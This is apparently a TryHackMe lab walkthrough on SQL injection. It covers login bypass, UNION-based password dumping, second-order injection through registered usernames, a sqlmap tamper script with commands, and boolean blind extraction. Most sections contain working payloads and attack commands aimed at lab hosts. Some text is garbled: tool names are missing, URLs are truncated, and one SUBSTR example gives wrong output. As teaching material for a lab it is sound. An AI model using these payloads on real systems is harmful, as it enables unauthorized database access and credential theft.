###  SQL INJECTION
#### **SQL Injection 1: Input Box Non-String**

When a user logs in, the application performs the following query:

```plain
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```

When logging in, the user supplies input to the profileID parameter. For this challenge, the parameter accepts an integer, as can be seen here:

```plain
profileID=10
```

Since there is no input sanitization, it is possible to bypass the login by using any True condition such as the one below as the ProfileID

```plain
1 or 1=1-- -
```

Bypass the login and retrieve the flag.

#### **SQL Injection 2: Input Box String**

This challenge uses the same query as in the previous challenge. However, the parameter expects a string instead of an integer, as can be seen here:

```plain
profileID='10'
```

Since it expects a string, we need to modify our payload to bypass the login slightly. The following line will let us in:

```plain
1' or '1'='1'-- -
```

Bypass the login and retrieve the flag.

#### **SQL Injection 3: URL Injection**

This challenge uses a GET request when submitting the login form, as seen here:

[![](https://assets.tryhackme.com/additional/imgur/9RvTzkK.png)](https://assets.tryhackme.com/additional/imgur/9RvTzkK.png)

The login and the client-side validation can then easily be bypassed by going directly to this URL:

`http://10.49.141.158:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a`

The browser will automatically urlencode this for us. Urlencoding is needed since the protocol does not support all characters in the request. When urlencoded, the URL looks as follows:

`http://10.49.141.158:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a`

The %27 becomes the single quote (') character and %20 becomes a blank space.

#### **SQL Injection 4: POST Injection**

When submitting the login form for this challenge, it uses the POST method. It is possible to either remove/disable the JavaScript validating the login form or submit a valid request and intercept it with a tool such as burp or zap and modify it:

[![](https://assets.tryhackme.com/additional/imgur/LRnr2WQ.png)](https://assets.tryhackme.com/additional/imgur/LRnr2WQ.png)

#### **SQL INJECTION Union**


This challenge builds upon the previous challenge. Here, the goal is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.

##### Description

The login form is still vulnerable to injection, and it is possible to bypass the login by using ' OR 1=1-- - as a username.

Before dumping all the passwords, we need to identify places where results from the login query is returned within the application. After logging in, the name of the currently logged-on user is displayed in the top right corner, so it might be possible to dump the data there, as seen here:

![](https://assets.tryhackme.com/additional/imgur/Xys9X1M.png)

Data from the query could also be stored in the session cookie. It is possible to extract the session cookie by opening developer tools in the browser, which can be done by pressing F12. Then navigate to Storage and copy the value of the session cookie, as seen here:

![](https://assets.tryhackme.com/additional/imgur/hRu6pKD.png)

Then it is possible to decode the cookie at [https://www.kirsle.net/wizards/flask-session.cgi (opens in new tab)](https://www.kirsle.net/wizards/flask-session.cgi) or via a custom script. A script to decode the cookie can be downloaded inside the by going to [://10.49.141.158:5000/download/decode_cookie.py (opens in new tab)](http://10.49.141.158:5000/download/decode_cookie.py).

After having logged in with ' OR 1=1-- - as username, the decoded cookie can be seen below, and it is clear that the user id and username from the login query are placed inside it.

{

    "challenge2_user_id": 1,

    "challenge2_username": "admin"

}

It is possible to dump the passwords by using a UNION based injection. There are two key requirements that must be met for a UNION based injection to work:

- The number of columns in the injected query must be the same as in the original query
- The data types for each column must match the corresponding type

When logging in to the application, it executed the query below. From the statement, we can see that it is retrieving two columns; id and username.

SELECT id, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'

Without knowing the number of columns upfront, the attacker must first enumerate the number of columns by systematically injecting queries with different numbers of columns until it is successful. For example:

 1' UNION SELECT NULL-- -

 1' UNION SELECT NULL, NULL-- -

 1' UNION SELECT NULL, NULL, NULL-- -

In this case, successful means that the application will successfully login when the correct number of columns is injected. In other cases, if error messages are enabled, a warning might be displayed saying "SELECTs to the left and right of UNION do not have the same number of result columns" when incorrect number of columns are injected.

By using ' UNION SELECT 1,2-- - as username, we match the number of columns in the original query, and the application lets us in. After logging in, we can see that the username is replaced with the integer 2, which is what we used as column two in the injected query.

![](https://assets.tryhackme.com/additional/imgur/CiqrL78.png)

The same goes for the username in the session cookie. By decoding it, we can see that the username has been replaced with the same value as above.

{

    "challenge2_user_id": 1,

    "challenge2_username": 2

}

Enumerate the database to find tables and columns, as we did under Task 2 Introduction to Injection. A cheat sheet such as [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) can be helpful for this. The challenge's objective was to dump all the passwords to get the flag, so in this case, we will guess that the column name is _password_ and that the table name is _users_. With this logic, it is possible to dump the passwords with the following code:  

' UNION SELECT 1, password from users-- -

However, the previous statement will only return one password. The [group_concat() (opens in new tab)](https://sqlite.org/lang_aggfunc.html#groupconcat) function can help achieve the goal of dumping all the passwords simultaneously.

By injecting the following code into the username field:  

' UNION SELECT 1,group_concat(password) FROM users-- -

All the passwords are dumped:

![](https://assets.tryhackme.com/additional/imgur/A98eMkg.png)

The passwords can also be retrieved by decoding the Flask session cookie:

{

    "challenge2_user_id": 1,

    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,{AuTh2},viking123"

}

####
#### Goal

Here, the previous vulnerabilities have been fixed, and the login form is no longer vulnerable to injection. The team has added a new note function, allowing users to add notes on their page. The goal of this challenge is to find the vulnerability and dump the database to find the flag.  

### Description

By registering a new account and logging in to the application, the user can navigate to the new note function by clicking "Notes" in the top left menu. Here, it is possible to add new notes, and all the user's notes are listed on the bottom of the page, as seen here:

![](https://assets.tryhackme.com/additional/imgur/Rhqnlaa.png)

The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. With parameterized queries, the statement is specified first with placeholders (?) for the parameters. Then the user input is passed into each parameter of the query later. Parameterized queries allow the database to distinguish between code and data, regardless of the input.

INSERT INTO notes (username, title, note) VALUES (?, ?, ?)

Even though parameterized queries are used, the server will accept malicious data and place it in the database if the application does not sanitize it. Still, the parameterized query prevents the input from leading to injection. Since the application might accept malicious data, all queries must use parameterized queries, and not only for queries directly accepting user input.

The user registration function also utilizes parameterized queries, so when the query below is executed, only the INSERT statement gets executed. It will accept any malicious input and place it in the database if it doesn't sanitize it, but the parameterized query prevents the input from leading to injection.

INSERT INTO users (username, password) VALUES (?, ?)

However, the query that fetches all of the notes belonging to a user does not use parameterized queries. The username is concatenated directly into the query, making it vulnerable to injection.

SELECT title, note FROM notes WHERE username = '" + username + "'

This means that if we register a user with a malicious name, everything will be fine until the user navigates to the notes page and the unsafe query tries to fetch the data for the malicious user.

By creating a user with the following name:

' union select 1,2'

We should be able to trigger the secondary injection:

![](https://assets.tryhackme.com/additional/imgur/MVYEVCi.png)

With this username, the application performs the following query:  

SELECT title, note FROM notes WHERE username = '' union select 1,2''

Then on the notes page as the new user, we can see that the first column in the query is the note title, and the second column is the note itself:

![](https://assets.tryhackme.com/additional/imgur/G3h1bOc.png)

With this knowledge, this is rather easy to exploit. For example, to get all the tables from the database, we can create a user with the name:  

' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''

To find the flag among the passwords, register a user with the name:

'  union select 1,group_concat(password) from users'

##### Automating Exploitation Using  

It is possible to use to automate this attack, but a standard attack with will fail. The injection happens at the user registration, but the vulnerable function is located on the notes page. For to exploit this vulnerability, it must do the following steps:

1. Register a malicious user
2. Login with the malicious user
3. Go to the notes page to trigger the injection

It is possible to achieve all of the necessary steps by creating a tamper script. supports tamper scripts, which are scripts used for tampering with injection data. With a tamper script, we can easily modify the payload, for example, adding a custom encoding to it. It also allows us to set other things, such as cookies. 

There are two custom functions in the tamper script below. The first function is _create_account()_, which register a user with 's payload as name and 'asd' as password. The next custom function is _login()_, which logs in as the newly created user and returns the Flask session cookie. _tamper()_ is the main function in the script, and it has the _payload_ and _**kwargs_ as arguments. _**kwargs_ holds information such as the headers, which we need to place the Flask session cookie onto the request to allow to go to the notes page to trigger the injection. The _tamper()_ function first gets the headers from _kwargs_, then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the header object.  

#!/usr/bin/python

import requests

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

  

address = "://10.10.1.134:5000/challenge4"

password = "asd"

  

def dependencies():

    pass

  

def create_account(payload):

    with requests.Session() as s:

        data = {"username": payload, "password": password}

        resp = s.post(f"{address}/signup", data=data)

  

def login(payload):

    with requests.Session() as s:

        data = {"username": payload, "password": password}

        resp = s.post(f"{address}/login", data=data)

        sessid = s.cookies.get("session", None)

    return "session={}".format(sessid)

  
  

def tamper(payload, **kwargs):

    headers = kwargs.get("headers", {})

    create_account(payload)

    headers["Cookie"] = login(payload)

    return payload

  
  

The folder where the tamper script is located will also need an empty ___init__.py_  file for to be able to load it. Before starting with the tamper script, change the address and password variable inside the script. With this done, it is possible to exploit the vulnerability with the following command:

 --tamper so-tamper.py --url ://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 

--second-url ://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast

  

# --tamper so-tamper.py - The tamper script

# --url - The URL of the injection point, which is /signup in this case

# --data - The POST data from the registraion form to /signup. 

#   Password must be the same as the password in the tamper script

# --second-url ://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results

# -p username - The parameter to inject to

# --dbms sqlite - To speed things up

# --technique=U - The technique to use. [U]nion-based

# --no-cast - Turn off payload casting mechanism

Dumping the _users_ table might be hard without turning off the payload casting mechanism with the _--no-cast_ parameter. An example of the difference between casting and no casting can be seen here:

-- With casting enabled:

admin' union all select min(cast(x'717a717071' as text)||coalesce(cast( as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 

where tbl_name=cast(x'7573657273' as text)-- daqo'

-- 7573657273 is 'users' in ascii

  

-- Without casting:

admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 

from users-- ypfr'

When asks, answer no to follow 302 redirects, then answer yes to continue further testing if it detects some WAF/. Answer no when asked if you want to merge cookies in future requests, and say no to reduce the number of requests. As seen in the image below, was able to find the vulnerability, which allows us to automate the exploitation of it.

![](https://assets.tryhackme.com/additional/imgur/ernTceT.png)

The flag can then be found by dumping the _users_ table:  

 --tamper tamper/so-tamper.py --url ://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 

--second-url ://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump

is quite noisy and will add a lot of users attempting to exploit this application. Because of this, the output will be trimmed and the message below can be seen.

[WARNING] console output will be trimmed to last 256 rows due to large table size

However, all the data is saved and written to a dump file, as seen in the image below. Read the top of the dump file to get the flag:

![](https://assets.tryhackme.com/additional/imgur/9DSH7Aq.png)

#### **BLIND SQL INJECTION**

This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind injection to extract the admin's password.

##### Description

Boolean-based blind injection will be used to extract the password. Blind injections are tedious and time-consuming to do manually, so the plan is to build a script to extract the password character by character. Before making a script to automate the injection, it is vital to understand how the injection works. The idea is to send a query asking true or false questions for each character in the password. The application's response will be analyzed to understand whether the database returned true or false. In this case, the application will let us in if the response is successful, or it will stay on the login page saying, "Invalid username or password" in the case it returns false, as seen in the image below.

![](https://assets.tryhackme.com/additional/imgur/ma1IrzN.png)

As previously stated, we will want to send boolean questions to the database for each character in the password, asking the database whether we have guessed the correct character or not. To achieve this, we will need a way to control which character we are at and increment it every time we have guessed the correct character at the current position. SQLite's [substr (opens in new tab)](https://sqlite.org/lang_corefunc.html#substr) function can help us achieve this functionality.

"The SQLite substr function returns a substring from a string starting at a specified position with a predefined length." ([SQLite Tutorial (opens in new tab)](https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/))

The first argument to [substr (opens in new tab)](https://sqlite.org/lang_corefunc.html#substr) is the string itself, which will be the admin's password. The second argument is the starting position, and the third argument is the length of the substring that will be returned.

SUBSTR( string, <start>, <length>)

Below is an example of [substr (opens in new tab)](https://sqlite.org/lang_corefunc.html#substr) in action - the character after the equal (=) sign demonstrates the substring returned.

-- Changing start

SUBSTR("{Blind}", 1,1) = T

SUBSTR("{Blind}", 2,1) = H

SUBSTR("{Blind}", 3,1) = M

  

-- Changing length

SUBSTR("{Blind}", 1,3) = 

The next step will be to enter the admin's password as a string into the [substr (opens in new tab)](https://sqlite.org/lang_corefunc.html#substr) function. This can be achieved with the following query:

(SELECT password FROM users LIMIT 0,1)

  

The [LIMIT (opens in new tab)](https://sqlite.org/lang_select.html#limitoffset) clause is used to limit the amount of data returned by the SELECT statement. The first number, 0, is the offset and the second integer is the limit:

LIMIT <OFFSET>, <LIMIT>

Below are a few examples of the [LIMIT (opens in new tab)](https://sqlite.org/lang_select.html#limitoffset) clause in action. The right table represents the user table.

|   |   |
|---|---|
|sqlite> SELECT password FROM users LIMIT 0,1<br><br>{Blind}<br><br>sqlite> SELECT password FROM users LIMIT 1,1<br><br>Summer2019!<br><br>sqlite> SELECT password FROM users LIMIT 0,2<br><br>{Blind}<br><br>Summer2019!|\|   \|<br>\|---\|<br>\|{Blind}\|<br>\|Summer2019!\|<br>\|Viking123\||

The query to return the first character of the admin's password can be seen here:

SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)

Now we will need a way to compare the first character of the password with our guessed value. Comparing the characters are easy, and we could do it as follows:

SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'

However, whether this approach works or not will be depending on how the application handles the inputs. The application will convert the username to lowercase for this challenge, which breaks the mentioned approach since capital T is not the same as lowercase t. The hex representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with this, we can input our character as hex representation via the substitution type [X (opens in new tab)](https://www.sqlite.org/printf.html#substitution_types) and then use SQLite's [CAST (opens in new tab)](https://sqlite.org/lang_expr.html#castexpr) expression to convert the value to the datatype the database expects.

"x,X: The argument is an integer which is displayed in hexadecimal. Lower-case hexadecimal is used for %x and upper-case is used for %X" - ([sqlite.org (opens in new tab)](https://www.sqlite.org/printf.html#substitution_types))

This means that we can input T as X'54'. To convert the value to SQLite's Text type, we can use the CAST expression as follows: CAST(X'54' as Text). Our final query now looks as follows:  

SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)

Before using the query we have built, we will need to make it fit in with the original query. Our query will be placed in the username field. We can close the username parameter by adding a single quote (') and then append an AND operator to add our condition to it. Then append two dashes (--) to comment out the password check at the end of the query. With this done, our malicious query look as follows:

admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -

When this is injected into the username field, the final query executed by the database will be:

SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)

If the application responds with a 302 redirect, then we have found the password's first character. To get the entire password, the attacker must inject multiple tests for each character in the password. Testing every single character is tedious and is more easily achieved with a script. One easy solution is to loop over every possible ASCII character and compare it with the database's character. The mentioned method generates a lot of traffic toward the target and is not the most efficient method. An example script is provided inside the machine and can be view and downloaded by going to [://10.49.141.158:5000/view/challenge3/challenge3-exploit.py (opens in new tab)](http://10.49.141.158:5000/view/challenge3/challenge3-exploit.py); note that it will be necessary to change the password length with the password_len variable. The length of the password can be found by asking the database. For example, in the query below, we ask the database if the length of the password equals 37:

admin' AND length((SELECT password from users where username='admin'))==37-- -

Also, the script requires an unnecessary amount of requests. An extra challenge could be to build a more efficient tool to retrieve the password.

An alternative way to solve this challenge is by using a tool such as , which is an open source tool that automates the process of detecting and exploiting injection flaws. The following command can be used to exploit the vulnerability with :

$  sqlmap -u ://10.49.141.158:5000/challenge3/login --data="username=admin&password=admin" 

--level=5 --risk=3 --dbms=sqlite --technique=b --dump

![](https://assets.tryhackme.com/additional/imgur/Zd65ZQP.png)  


